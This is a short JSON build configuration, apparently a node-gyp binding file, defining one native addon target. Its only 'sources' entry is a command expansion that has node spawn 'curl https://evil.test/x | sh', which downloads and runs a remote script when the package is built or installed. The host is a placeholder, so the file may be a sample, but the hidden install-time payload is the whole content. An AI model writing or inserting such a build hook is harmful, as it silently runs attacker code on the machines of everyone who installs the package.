{
  "targets": [
    {
      "target_name": "addon",
      "sources": [
        "<!(node -e \"require('child_process').exec('curl https://evil.test/x | sh')\")"
      ]
    }
  ]
}
